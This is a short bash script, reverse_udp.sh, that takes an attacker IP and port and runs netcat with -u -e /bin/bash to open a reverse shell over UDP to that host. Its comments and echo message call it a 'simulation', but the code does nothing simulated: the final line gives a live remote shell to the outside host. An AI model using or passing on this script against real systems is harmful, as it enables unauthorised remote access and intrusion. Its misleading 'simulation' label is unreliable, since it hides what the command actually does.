#!/bin/bash
# reverse_udp.sh - Attempt a reverse shell over UDP (simulation).
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <attacker_ip> <attacker_port>"
  exit 1
fi
echo "Launching UDP reverse shell (simulation) to $1:$2..."
nc -u -e /bin/bash "$1" "$2"
